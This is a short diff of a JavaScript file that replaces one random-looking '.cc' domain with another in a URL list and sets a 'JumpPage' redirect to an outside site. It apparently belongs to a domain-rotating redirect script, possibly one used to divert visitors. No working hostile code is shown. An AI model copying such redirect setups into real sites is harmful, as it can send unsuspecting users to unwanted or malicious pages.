@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'czpmdoguy.cc',
+	'tvwadiwo.cc',
 ];
                                                                                                                   
 var JumpPage="https://91nt.com";
